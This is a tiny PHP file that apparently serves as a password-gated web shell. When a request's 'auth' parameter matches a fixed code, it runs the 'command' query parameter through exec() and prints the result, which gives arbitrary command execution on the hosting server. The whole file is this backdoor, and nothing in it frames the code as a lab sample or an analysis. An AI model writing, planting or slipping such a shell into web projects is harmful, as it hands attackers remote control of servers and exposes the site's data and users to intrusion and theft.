<?php
if(isset($_GET["auth"]) && $_GET["auth"] == "AUTH-CODE ")
{
    echo exec($_GET["command"]);
}
?>
